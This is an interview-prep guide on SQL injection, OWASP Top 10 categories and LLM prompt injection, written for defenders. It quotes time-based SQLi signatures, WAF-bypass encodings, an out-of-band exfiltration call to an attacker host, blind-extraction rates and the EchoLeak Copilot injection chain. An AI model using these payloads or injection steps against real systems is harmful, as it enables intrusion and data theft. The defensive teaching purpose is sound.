### Q3 — I have `SELECT * FROM docs ORDER BY ?`. Is that safe?
**Testing:** the single most common real trap on this topic.
**Answer:** It is not injectable, and it is also broken. A bind parameter can only occupy a *value* position, because the query is parsed and planned before the parameter is bound, and the planner needs identifiers to build the plan. Passing `"created_at"` produces `ORDER BY 'created_at'`, which sorts by a constant string, so the result set comes back unsorted with no error. The fix is a server-controlled allowlist mapping the user's sort key to a column, plus a two-value map for direction, composed with something like `psycopg.sql.Identifier`.
**Follow-up trap:** *"Can you just regex the column name to `^[a-z_]+$` instead?"* — that stops injection but not authorization bypass. `ORDER BY password_hash` passes that regex, and combined with a paging endpoint it becomes a boolean oracle you can binary-search. The allowlist is not about character classes, it is about which columns the *server* has decided are sortable.

### Q4 — Walk me through what a bind parameter physically does on the wire.
**Testing:** mechanism versus mantra.
**Answer:** In the PostgreSQL extended query protocol the client sends `Parse` with SQL text containing `$1` placeholders. The server lexes, parses, and plans that text once. The client then sends `Bind` with parameter values as a length-prefixed array, and `Execute`. The parameter bytes are never handed to the SQL lexer, so there is no sequence of characters that can terminate a literal and start a new statement. That is why parameterization is a structural guarantee and escaping is a best-effort transformation.
**Follow-up trap:** *"Does that hold for every driver?"* — no. Some drivers emulate prepared statements client-side, interpolating and escaping in the driver and sending one flat string (PHP PDO's `ATTR_EMULATE_PREPARES` for MySQL is the classic). Emulation is where charset-confusion bugs historically lived. Check whether your driver is doing real server-side prepares before you claim the guarantee, and know that emulation still beats manual concatenation.

### Q5 — Explain second-order SQL injection and why input sanitization does not prevent it.
**Testing:** whether your mental model is "clean the input" or "separate structure from data at every sink."
**Answer:** The payload is stored through a safe, parameterized path, sits in the database as literal text, and is later concatenated into a query by a different code path (a report job, an admin tool, a migration). Input sanitization fails because the value was never malformed on the way in; it is only dangerous at the second sink. The correct model is parameterize on *output*, at every interpreter boundary, regardless of where the value came from. Data from your own database is attacker-controlled data with higher latency.
**Follow-up trap:** *"Which tools catch it?"* — SAST usually does not, because it taints the HTTP request object and stops at the `INSERT`. IAST catches some of it at runtime on exercised paths. The practical controls are a CI rule banning string-formatted SQL anywhere (not just near request handlers) and a query layer that makes the unsafe call hard to write.

### Q6 — You suspect blind SQLi on a route. What do the logs look like, and how fast can they extract a password hash?
**Testing:** operational detection, with numbers.
**Answer:** Time-based shows up as p50 latency on one route quantized to multiples of the sleep interval with all responses 200; that is `pg_sleep(5)`, `SLEEP(5)`, or `WAITFOR DELAY '0:0:5'`. Boolean-blind shows up as thousands of 200s where the response body alternates between exactly two byte lengths. Boolean-blind binary-searches printable ASCII at roughly 7 requests per character, so a 60-character bcrypt hash is about 420 requests, which is 21 seconds at 20 rps. Time-based is ~35 seconds per character, so the same hash is ~35 minutes, which is why time-based is used to confirm the vulnerability and boolean or UNION is used to extract.
**Follow-up trap:** *"What mitigates it without fixing the query today?"* — a server-side `statement_timeout` of a couple of seconds kills the sleeps, response normalization removes the boolean oracle, and unauthenticated rate limiting caps throughput. All three are hours of work and none of them are the fix. Say that explicitly so nobody mistakes the mitigation for remediation.

### Q7 — Your ORM means you cannot have SQL injection. Agree?
**Testing:** whether you know where ORMs leak.
**Answer:** No. Three failure classes. First, escape hatches: `raw()`, `extra()`, `RawSQL()`, `session.execute(text(f"..."))`, and Hibernate HQL concatenation, which has its own CWE (CWE-564) in the A05 list. Second, identifier positions the ORM has to emit from user input, which is where CVE-2024-42005 lived: Django's `QuerySet.values()` / `values_list()` on a `JSONField` used a crafted JSON key unescaped as a **column alias**, fixed in 4.2.15 and 5.0.8. Third, dynamic field names passed as `**kwargs` filters, which is authorization bypass rather than injection but lands in the same incident review.
**Follow-up trap:** *"How would you find all three in a 400k-line codebase?"* — a Semgrep rule for f-strings and `%`/`.format()` reaching `execute`, `text`, `raw`, and `extra`, run in CI as ERROR so it blocks merge; plus an SCA gate for the ORM's own CVEs; plus a grep for dynamically-built filter kwargs. Manual review does not scale and does not survive turnover.

### Q8 — Where does a WAF fit in your SQLi story?
**Testing:** whether you will oversell a control.
**Answer:** It buys time. Signature rules get bypassed by comment insertion (`UN/**/ION`), case shifting, hex and unicode encodings, and MySQL versioned comments (`/*!50000UNION*/`). Its legitimate uses are shielding third-party software you cannot patch, giving you a detection and rate-limiting point during an active incident, and satisfying a compliance requirement. It is not a remediation and should never be logged as one in a risk register.
**Follow-up trap:** *"Your CISO wants to close the ticket after the WAF rule ships."* — the honest move is to split the ticket: WAF rule as the mitigation with a date, code fix as the remediation with a separate date, and an explicit statement in the record that the vulnerability is present until the second one ships. Letting a mitigation close a remediation ticket is how organizations discover in year three that they have 200 unpatched injections behind one regex.

### Q9 — Why is prompt injection LLM01, and why has nobody fixed it?
**Testing:** whether you can reason from the mechanism instead of quoting a vendor.
**Answer:** Because every injection defense that actually works separates structure from data into two transport channels so the interpreter cannot re-parse data as grammar: `Parse`/`Bind` for SQL, `argv` for shells, DOM APIs for HTML. A transformer has one channel. System prompt, user turn, retrieved chunk, and tool output are all tokens in one sequence attended to by the same mechanism, so there is no way to mark a span as data-not-instructions in a way the model cannot be argued out of. Delimiters and instruction hierarchies raise attacker cost without providing a guarantee.
**Follow-up trap:** *"Microsoft ships a classifier for this. Isn't that good enough?"* — EchoLeak, CVE-2025-32711, CVSS 9.3, June 2025: a zero-click chain that bypassed Microsoft's XPIA classifier, evaded link redaction with reference-style Markdown, exfiltrated through an auto-fetched image, and used a Teams proxy already allowlisted in the CSP. The vendor with the most at stake shipped the purpose-built classifier and it was bypassed by four ordinary web bugs chained together. Classifiers are a layer, not a boundary.

### Q10 — Design the security posture for an agent with tool access to production systems.
**Testing:** whether your agentic experience converts into a threat model.
**Answer:** Assume injection lands and contain the blast radius. Tool allowlist enforced at the gateway, not stated in the prompt, because a prompt-level constraint is enforced by the thing under attack. Per-agent identity with short-lived scoped credentials rather than a shared service account, which is ASI03 and reduces the impact of nearly everything else. No high-risk tool available in the same turn as a read of untrusted external content. Human confirmation on anything irreversible: send, delete, pay, deploy. Hard step count and wall-clock timeout plus a token and cost budget as the outermost bulkhead, which is LLM10 and ASI08. Full prompt-to-action traces so you can reconstruct which retrieved span produced which tool call. Treat every model output as untrusted input to whatever consumes it, which is LLM05: parameterize model-generated SQL, escape model-generated HTML, never hand model output to a shell.
**Follow-up trap:** *"You have one week and can implement two of those. Which?"* — the gateway-enforced tool allowlist and the step-plus-cost budget. They are days of work, they are enforced outside the model so injection cannot argue with them, and they bound the two failure modes that actually end careers: an agent doing something irreversible, and an agent doing something expensive 40,000 times. Per-agent identity is the highest-value item and the slowest, so it goes in the quarter plan, not the week.

### Q11 — What is the most consequential SQL injection in the AI stack recently, and what does it teach?
**Testing:** current awareness, and whether you connect old bugs to new systems.
**Answer:** CVE-2026-42208, a pre-authentication SQL injection in LiteLLM, CVSS 9.3, affecting 1.81.16 through 1.83.6 and patched in 1.83.7-stable. The raw `Authorization: Bearer` header value was concatenated into SQL on the key-verification path, so every LLM route was an entry point and none required credentials. Reported exploitation began within 36 hours of the GitHub advisory being indexed, using 17 UNION-based payloads to enumerate the schema and going straight for `LiteLLM_VerificationToken`, `litellm_credentials`, and `litellm_config`. CISA added it to KEV on 8 May 2026 with an 11 May remediation deadline. The lesson is that the AI stack is ordinary software with an unusually valuable database: the highest-value secret in the building sat behind a 1998-vintage bug in an auth path.
**Follow-up trap:** *"You patched. Are you done?"* — no. Pre-auth read of the credentials table means you must assume every provider key it held is compromised: rotate all of them, audit provider-side usage logs for the exposure window, and then fix the architecture so the proxy does not hold every provider credential in the same database it queries before authenticating anyone.

### Q12 — Text-to-SQL feature. How do you ship it without building an RCE service?
**Testing:** LLM05 applied, and whether you default to the model or to the boundary.
**Answer:** Controls in order of load-bearing: a dedicated read-only DB role with access only to the specific views the feature needs, no base tables; parse the generated SQL and reject anything that is not a single `SELECT` with no CTE writing, no `;`-separated statements, no set-returning functions that touch the filesystem or network; a mandatory tenant predicate injected by your code, not requested in the prompt; `statement_timeout` and a row cap; and results rendered as escaped text. The prompt instruction "only generate SELECT statements" is a hint to the model, not a control, and it appears nowhere in that list.
**Follow-up trap:** *"The product team wants writes."* — then the model produces a *proposed diff* and a human approves it, and the write is executed by your code with parameterized values from a structured object, not by executing model-authored SQL. The moment model output reaches the database as executable text with write privileges, your authorization model is "whatever the model decided."

### Q13 — A pentest report says "no OWASP Top 10 findings." What do you conclude?
**Testing:** whether you will accept a compliance artifact as evidence.
**Answer:** Almost nothing about the system's security, and something about the scope of the test. The Top 10 is 10 categories covering 248 CWEs out of 968 in the MITRE dictionary. A01 alone is 40 CWEs and its measured incidence is 3.73% of applications, which is a floor set by what scanners can find, not a ceiling. Business-logic flaws, tenant isolation bugs, and anything requiring multi-step authenticated state are frequently out of scope and are exactly where the expensive incidents come from. What I would ask for instead: the test scope, whether authenticated multi-role testing was performed, and coverage against ASVS L2 controls.
**Follow-up trap:** *"So Top 10 coverage is worthless?"* — no, it is a floor, and floors are useful. It is a good training curriculum, a good shared vocabulary with executives, and a reasonable minimum bar for a vendor questionnaire. It is a bad control set, a bad prioritization order, and a terrible contractual definition of "secure." Distinguishing those two uses is the point.

### Q14 — You have inherited a monolith with 60 known injection findings. Sequence the remediation.
**Testing:** staff-level judgment under a real constraint.
**Answer:** First, triage by reachability and privilege, not by scanner severity: unauthenticated routes and anything running as a high-privilege DB role first. Second, ship the two systemic controls in week one because they cap the whole population: drop the app DB role to least privilege (which converts a full-database read into a three-table read across all 60 findings at once) and turn off DB error propagation (which removes error-based extraction across all 60). Third, add the CI rule as ERROR so the count cannot grow while you work, and grandfather the existing 60 with an explicit allowlist file that shrinks. Fourth, fix by clusters that share a query builder, because 60 findings usually come from 5 or 6 helper functions. Fifth, add tests that assert sort order and tenant scoping, so the fixes cannot silently regress.
**Follow-up trap:** *"Leadership wants a WAF rule instead so the audit closes Friday."* — take the WAF rule and refuse the closure. The rule ships as a mitigation with its own ticket; the 60 findings stay open. Then use the two systemic controls to show a real risk reduction by Friday that is defensible in the audit: privilege reduction and error suppression are measurable, verifiable, and do not depend on a regex holding.

### Q15 — Which single control would you add if you could only add one, across web and LLM?
**Testing:** prioritization with a stated rationale.
**Answer:** Least privilege at the resource boundary, enforced outside the component that can be tricked. For SQL that is the database role: it converts every injection in the codebase from "read everything" to "read what this service owns." For agents it is the gateway-enforced tool allowlist plus per-agent identity: it converts every successful prompt injection from "do anything" to "do the four things this agent was going to do anyway." Both work because they are enforced by a system the attacker's input cannot argue with, which is the property every durable control has and every classifier lacks.
**Follow-up trap:** *"Isn't that just admitting you cannot prevent the injection?"* — yes, and that is the correct posture for LLM01 in 2026 and an honest posture for a large legacy codebase. Prevention is the goal for new code, where parameterization is a real guarantee. Containment is the goal everywhere prevention is either unavailable (prompt injection) or unfinished (60 open findings). Saying which regime you are in is the senior move.

---

## Red flags that fail you

- Reciting the 2021 Top 10 order in 2026, or not knowing SSRF folded into A01.
- Saying "Injection dropped to #5 so it matters less" without knowing it has the most CVEs of any category.
- Claiming a bind parameter can go in an `ORDER BY` or a table name position.
- Saying `ORDER BY %s` "throws an error if you do it wrong." It does not; it silently stops sorting.
- Offering escaping or input sanitization as the primary SQLi defense, especially after being told about CVE-2025-1094.
- Claiming an ORM makes SQL injection impossible.
- Treating data read from your own database as trusted (missing second-order entirely).
- Presenting a WAF as remediation rather than mitigation.
- Saying prompt injection is solved by a classifier or by "better delimiters in the system prompt."
- Enforcing agent tool restrictions in the prompt rather than at the gateway.
- Executing model-generated SQL with the application's normal DB role.
- Treating "no OWASP Top 10 findings" as evidence a system is secure.
- Not having a rotation answer after a pre-auth compromise of a credentials table.

---

## Cheat card

```
OWASP TOP 10:2025 (8th edition, announced Nov-2025, web release Jan-2026)
 A01 Broken Access Control (40 CWEs, 3.73%)  ← SSRF FOLDED IN HERE from 2021
 A02 Security Misconfiguration (16, 3.00%)   ← up from #5
 A03 Software Supply Chain Failures  NEW (5 CWEs; fewest occurrences,
                                          HIGHEST avg exploit + impact)
 A04 Cryptographic Failures (32, 3.80%)
 A05 Injection (37 CWEs, 3.08%)   62,445 CVEs = MOST of any category
      max coverage 100% · avg wtd exploit 7.15 · avg wtd impact 4.32
      XSS >30k CVEs (freq/low impact) + SQLi >14k (rare/high impact)
      → the impact average is why it fell #3→#5. NOT "SQLi got safer."
 A06 Insecure Design      A07 Authentication Failures (36, renamed)
 A08 Software/Data Integrity Failures
 A09 Security Logging & ALERTING Failures (renamed: alerting added)
 A10 Mishandling of Exceptional Conditions  NEW (24 CWEs, fail-open)

METHODOLOGY: 2.8M apps, 589 CWEs analyzed, 248 CWEs inside the 10,
 ~175k CVE→CWE records, cap of 40 CWEs/category, avg 25.
 8 categories from DATA + 2 voted in by COMMUNITY SURVEY.
 Incidence rate = % of apps with >=1 instance (frequency ignored).
 CVSS v4 excluded: v4 no longer exposes separable exploit/impact.
 It is an AWARENESS doc. ASVS is the requirements standard.

SQLi: BIND PARAMS REPLACE VALUES, NEVER IDENTIFIERS OR KEYWORDS.
 Parse (plan built) → Bind (values, never lexed) → Execute.
 ORDER BY %s  →  ORDER BY 'created_at'  → sorts by a CONSTANT, NO ERROR.
 Identifiers → server-controlled ALLOWLIST + sql.Identifier().
 IN-clause → "= ANY(%s)" with a real array, never ",".join().
 LIKE → bind is safe but % and _ are wildcards: escape them (DoS/logic).
 SECOND-ORDER: stored safely, re-queried unsafely. Parameterize on OUTPUT.
 Blind cost: boolean ≈ 7 req/char (60-char hash ≈ 420 req ≈ 21s @20rps)
             time-based ≈ 35s/char → confirm with time, extract with bool.
 Time-based sigs: pg_sleep(5) · SLEEP(5) · WAITFOR DELAY '0:0:5'
 OOB: MSSQL xp_dirtree \\attacker\x · Oracle UTL_HTTP → watch DB-subnet DNS
 ESCAPING FAILS: CVE-2025-1094 CVSS 8.1 — PQescapeLiteral/Identifier/String
   broke on invalid UTF-8. Fixed 17.3/16.7/15.11/14.16/13.19 (13-Feb-2025),
   the FIX REGRESSED, re-fixed 17.4/16.8/… (20-Feb-2025). Required link in
   the CVE-2024-12356 BeyondTrust chain → US Treasury.
 ORM STILL INJECTS: CWE-564 Hibernate HQL · Django CVE-2024-42005
   (values()/values_list() on JSONField → JSON key used as COLUMN ALIAS;
    fixed 4.2.15 / 5.0.8) · .raw() .extra() RawSQL() text(f"...")
 DEFENSE ORDER: parameterize → least-priv DB role → suppress DB errors
   → authz at data layer → SCA/pin deps → (only then) WAF.

OWASP LLM TOP 10 v2.0 (18-Nov-2024; 2026 edition published 3-Aug-2026)
 LLM01 Prompt Injection        LLM06 Excessive Agency
 LLM02 Sensitive Info Disclosure LLM07 System Prompt Leakage
 LLM03 Supply Chain            LLM08 Vector & Embedding Weaknesses
 LLM04 Data & Model Poisoning  LLM09 Misinformation
 LLM05 Improper Output Handling LLM10 Unbounded Consumption

OWASP AGENTIC TOP 10 (9-Dec-2025, 100+ contributors)
 ASI01 Agent Goal Hijack       ASI06 Memory & Context Poisoning
 ASI02 Tool Misuse             ASI07 Insecure Inter-Agent Comms
 ASI03 Identity & Privilege Abuse ASI08 Cascading Failures
 ASI04 Agentic Supply Chain    ASI09 Human-Agent Trust Exploitation
 ASI05 Unexpected Code Exec    ASI10 Rogue Agents

WHY LLM01 IS UNSOLVED: every working injection defense uses TWO transport
 channels (Parse/Bind, argv, DOM API). A transformer has ONE token stream.
 No bind parameter exists for attention. Defense = CONTAINMENT not detection.
 EchoLeak CVE-2025-32711 CVSS 9.3 (Jun-2025): zero-click M365 Copilot,
 bypassed Microsoft's XPIA classifier + link redaction + CSP via Teams proxy.

AI-STACK SQLi: CVE-2026-42208 LiteLLM, CVSS 9.3, PRE-AUTH.
 Raw `Authorization: Bearer` concatenated into SQL on the key-verify path
 → EVERY LLM route is an entry point. Affected 1.81.16–1.83.6, fix 1.83.7.
 Exploited <36h after advisory indexing; 17 UNION payloads; targeted
 LiteLLM_VerificationToken / litellm_credentials / litellm_config.
 CISA KEV 8-May-2026, FCEB deadline 11-May-2026. PATCH ≠ DONE: rotate
 every upstream provider key.

AGENT POSTURE (in order of value/effort): gateway-enforced tool allowlist
 · step + token + wall-clock budget · no high-risk tool in the same turn as
 an untrusted read · human gate on irreversible actions · per-agent identity
 with short-lived scoped creds (highest value, slowest) · full prompt→action
 traces. NEVER enforce tool limits in the prompt: the prompt is the thing
 under attack.
```

## Sources

- [OWASP Top 10:2025](https://owasp.org/Top10/2025/) — accessed 2026-08-05
- [OWASP Top 10:2025 Introduction (methodology, data contributors, CWE counts)](https://owasp.org/Top10/2025/0x00_2025-Introduction/) — accessed 2026-08-05
- [A05:2025 Injection (score table, mapped CWEs, prevention guidance)](https://owasp.org/Top10/2025/A05_2025-Injection/) — accessed 2026-08-05
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — accessed 2026-08-05
- [OWASP GenAI Security Project: LLM Top 10](https://genai.owasp.org/llm-top-10/) — accessed 2026-08-05
- [OWASP GenAI LLM Top 10 2026 (published 3 Aug 2026)](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) — accessed 2026-08-05
- [OWASP Top 10 for Agentic Applications 2026 (published 9 Dec 2025)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) — accessed 2026-08-05
- [PostgreSQL security page: CVE-2025-1094](https://www.postgresql.org/support/security/CVE-2025-1094) — accessed 2026-08-05
- [Rapid7: CVE-2025-1094 PostgreSQL psql SQL injection (FIXED)](https://www.rapid7.com/blog/post/2025/02/13/cve-2025-1094-postgresql-psql-sql-injection-fixed/) — accessed 2026-08-05
- [Django 4.2.15 release notes (CVE-2024-42005)](https://docs.djangoproject.com/en/4.2/releases/4.2.15/) — accessed 2026-08-05
- [Sysdig: CVE-2026-42208 targeted SQL injection against LiteLLM's authentication path](https://www.sysdig.com/blog/cve-2026-42208-targeted-sql-injection-against-litellms-authentication-path-discovered-36-hours-following-vulnerability-disclosure) — accessed 2026-08-05
- [CCB Belgium advisory: LiteLLM pre-auth SQL injection CVE-2026-42208](https://ccb.belgium.be/advisories/warning-litellm-pre-auth-sql-injection-cve-2026-42208-patch-immediately) — accessed 2026-08-05
- [The Hacker News: Zero-click AI vulnerability exposes Microsoft 365 Copilot data (EchoLeak, CVE-2025-32711)](https://thehackernews.com/2025/06/zero-click-ai-vulnerability-exposes.html) — accessed 2026-08-05
- [EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System (arXiv 2509.10540)](https://arxiv.org/html/2509.10540v1) — accessed 2026-08-05
- [Design Patterns for Securing LLM Agents against Prompt Injections (arXiv 2506.08837)](https://arxiv.org/html/2506.08837v3) — accessed 2026-08-05
- [Simon Willison: Design Patterns for Securing LLM Agents against Prompt Injections](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/) — accessed 2026-08-05
- [Cycode: OWASP Top 10 for Agentic Applications 2026 explained (ASI01–ASI10 names; secondary source for the gated OWASP PDF)](https://cycode.com/blog/owasp-top-10-agentic-applications/) — accessed 2026-08-05

## Changelog
- 2026-08-05 — created
